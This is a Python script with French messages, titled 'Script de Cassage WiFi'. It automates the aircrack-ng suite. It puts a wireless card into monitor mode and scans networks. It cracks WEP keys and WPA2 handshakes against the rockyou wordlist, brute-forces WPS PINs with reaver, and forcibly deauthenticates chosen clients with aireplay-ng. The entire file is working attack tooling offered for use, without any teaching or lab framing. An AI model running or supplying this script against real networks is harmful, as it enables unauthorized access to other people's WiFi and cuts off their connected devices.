#usr/bin/env python3

import os
import subprocess
import time

def scan_networks(interface="wlan0mon"):
    print("[+] Recherche des réseaux...")
    try:
        subprocess.run(["sudo", "airodump-ng", interface], check=True)
    except subprocess.CalledProcessError as e:
        print(f"[-] Erreur lors de la recherche : {e}")

def start_monitor_mode(interface="wlan0"):
    print(f"[+] Activation du mode moniteur sur {interface}...")
    try:
        subprocess.run(["sudo", "airmon-ng", "start", interface], check=True)
    except subprocess.CalledProcessError as e:
        print(f"[-] Erreur lors de l'activation du mode moniteur : {e}")

def stop_monitor_mode(interface="wlan0mon"):
    print(f"[+] Désactivation du mode moniteur sur {interface}...")
    try:
        subprocess.run(["sudo", "airmon-ng", "stop", interface], check=True)
    except subprocess.CalledProcessError as e:
        print(f"[-] Erreur lors de la désactivation du mode moniteur : {e}")

def crack_wep(bssid, channel, output_file):
    print(f"[+] Tentative de cassage WEP pour le BSSID {bssid} sur le canal {channel}...")
    try:
        subprocess.run(["sudo", "airodump-ng", "--bssid", bssid, "-c", channel, "-w", output_file, "wlan0mon"], check=True)
        print("[+] Démarrage de aircrack-ng...")
        subprocess.run(["sudo", "aircrack-ng", f"{output_file}-01.cap"], check=True)
    except subprocess.CalledProcessError as e:
        print(f"[-] Erreur lors du cassage WEP : {e}")

def crack_wpa2(bssid, channel, output_file, wordlist="/usr/share/wordlists/rockyou.txt"):
    print(f"[+] Capture de la poignée de main WPA2 pour le BSSID {bssid} sur le canal {channel}...")
    try:
        subprocess.run(["sudo", "airodump-ng", "--bssid", bssid, "-c", channel, "-w", output_file, "wlan0mon"], check=True)
        print("[+] Tentative de cassage de la poignée de main WPA2...")
        subprocess.run(["sudo", "aircrack-ng", f"{output_file}-01.cap", "-w", wordlist], check=True)
    except subprocess.CalledProcessError as e:
        print(f"[-] Erreur lors du cassage WPA2 : {e}")

def crack_wps(bssid, pin=None):
    print(f"[+] Tentative de cassage WPS pour le BSSID {bssid}...")
    try:
        if pin:
            subprocess.run(["sudo", "reaver", "-i", "wlan0mon", "-b", bssid, "-p", pin, "-vv"], check=True)
        else:
            subprocess.run(["sudo", "reaver", "-i", "wlan0mon", "-b", bssid, "-vv"], check=True)
    except subprocess.CalledProcessError as e:
        print(f"[-] Erreur lors du cassage WPS : {e}")

def deauth_target(bssid, client_mac):
    print(f"[+] Déconnexion forcée du client {client_mac} depuis le BSSID {bssid}...")
    try:
        subprocess.run(["sudo", "aireplay-ng", "--deauth", "10", "-a", bssid, "-c", client_mac, "wlan0mon"], check=True)
    except subprocess.CalledProcessError as e:
        print(f"[-] Erreur lors de la déconnexion forcée : {e}")

def auto_scan_and_crack():
    print("[+] Démarrage du mode automatique de recherche et cassage...")
    scan_networks()
    bssid = input("Entrez le BSSID cible : ")
    channel = input("Entrez le canal de la cible : ")
    encryption = input("Entrez le type de chiffrement (WEP/WPA2/WPS) : ").upper()
    output_file = input("Entrez le préfixe du fichier de sortie : ")

    if encryption == "WEP":
        crack_wep(bssid, channel, output_file)
    elif encryption == "WPA2":
        crack_wpa2(bssid, channel, output_file)
    elif encryption == "WPS":
        crack_wps(bssid)
    else:
        print("[-] Type de chiffrement non supporté !")

def main():
    print("========================")
    print(" Script de Cassage WiFi ")
    print("========================")
    start_monitor_mode()

    try:
        action = input("Sélectionnez une opération : (1) Cassage manuel, (2) Recherche et cassage auto, (3) Déconnexion forcée : ")
        if action == "1":
            bssid = input("Entrez le BSSID cible : ")
            channel = input("Entrez le canal de la cible : ")
            encryption = input("Entrez le type de chiffrement (WEP/WPA2/WPS) : ").upper()
            output_file = input("Entrez le préfixe du fichier de sortie : ")

            if encryption == "WEP":
                crack_wep(bssid, channel, output_file)
            elif encryption == "WPA2":
                crack_wpa2(bssid, channel, output_file)
            elif encryption == "WPS":
                crack_wps(bssid)
            else:
                print("[-] Type de chiffrement non supporté !")
        elif action == "2":
            auto_scan_and_crack()
        elif action == "3":
            bssid = input("Entrez le BSSID cible : ")
            client_mac = input("Entrez l'adresse MAC du client : ")
            deauth_target(bssid, client_mac)
        else:
            print("[-] Option invalide sélectionnée !")
    finally:
        stop_monitor_mode()

if __name__ == "__main__":
    main()